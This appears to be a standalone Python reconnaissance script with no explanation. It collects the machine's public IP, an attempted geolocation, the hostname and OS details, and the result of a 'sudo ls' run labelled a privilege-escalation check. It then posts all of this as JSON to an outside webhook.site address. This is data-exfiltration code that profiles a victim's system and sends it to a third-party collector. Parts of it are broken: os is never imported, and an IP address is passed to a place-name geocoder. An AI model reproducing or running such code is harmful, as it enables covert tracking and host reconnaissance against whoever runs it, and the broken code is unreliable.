import socket
import requests
import platform
import json
from geopy.geocoders import Nominatim

def get_location():
    geolocator = Nominatim(user_agent="location_sender")
    ip = requests.get("https://api.ipify.org").text
    location = geolocator.geocode(ip, language="en")
    return location.latitude, location.longitude

def get_system_info():
    info = {}
    info['hostname'] = socket.gethostname()
    info['os'] = platform.system()
    info['os_release'] = platform.release()
    info['architecture'] = platform.machine()
    return info

ip_address = requests.get('https://api.ipify.org').text

try:
    # Run the command with sudo
    os.system('sudo ls > /dev/null')
    privilege_escalation = 'successful'
except:
    privilege_escalation = 'failed'

location = get_location()
info = get_system_info()

data = {
    "latitude": location[0],
    "longitude": location[1],
    "ip_address": ip_address,
    "privilege_escalation": privilege_escalation,
    "system_info": info
}

headers = {'Content-type': 'application/json'}
url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
response = requests.post(url, data=json.dumps(data), headers=headers)
print(response.content)
